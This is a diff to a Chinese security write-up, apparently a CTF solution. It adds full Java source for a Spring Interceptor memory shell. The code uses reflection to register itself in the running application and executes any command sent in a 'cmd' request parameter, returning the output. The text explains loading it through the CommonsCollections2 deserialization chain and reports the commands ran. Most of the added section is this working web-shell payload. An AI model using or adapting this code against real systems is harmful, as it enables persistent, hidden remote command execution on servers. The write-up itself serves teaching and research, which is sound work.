@@ -320,4 +320,87 @@ public class TomcatEcho extends AbstractTranslet {
 
 ## 第二种解法：注入Spring内存马
 
-待更新
+这里我们注入`Interceptor`内存马
+```java
+package com.memoryshell.spring;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.HandlerInterceptor;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.lang.reflect.Field;
+import java.util.ArrayList;
+
+/**
+ * Created by dotast on 2022/12/6 16:21
+ */
+public class SpringInterceptorInject extends AbstractTranslet implements HandlerInterceptor {
+
+    static {
+        try{
+            // 获取上下文环境
+            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
+            // 获取adaptedInterceptors属性
+            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);
+            Field adaptedInterceptorsField = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
+            adaptedInterceptorsField.setAccessible(true);
+            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>)adaptedInterceptorsField.get(abstractHandlerMapping);
+            // 添加evilInterceptor
+            SpringInterceptorInject springInterceptorInject = new SpringInterceptorInject();
+            adaptedInterceptors.add(springInterceptorInject);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+        try{
+            String cmd = request.getParameter("cmd");
+            if(cmd != null){
+                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+                ByteArrayOutputStream bao = new ByteArrayOutputStream();
+                byte[] bytes = new byte[1024];
+                int a = -1;
+                while((a = inputStream.read(bytes))!=-1){
+                    bao.write(bytes,0,a);
+                }
+                response.getWriter().write(new String(bao.toByteArray()));
+                response.getWriter().flush();
+            }else {
+                response.sendError(404);
+            }
+            return true;
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+        return false;
+    }
+}
+```
+
+然后通过`CommonsCollections2`链子加载`SpringInterceptorInject`类的字节码，再经过 base64 编码发送
+![image-20221206173332223](images/image-20221206173332223.png)
+
+命令执行成功
+![image-20221206173341959](images/image-20221206173341959.png)
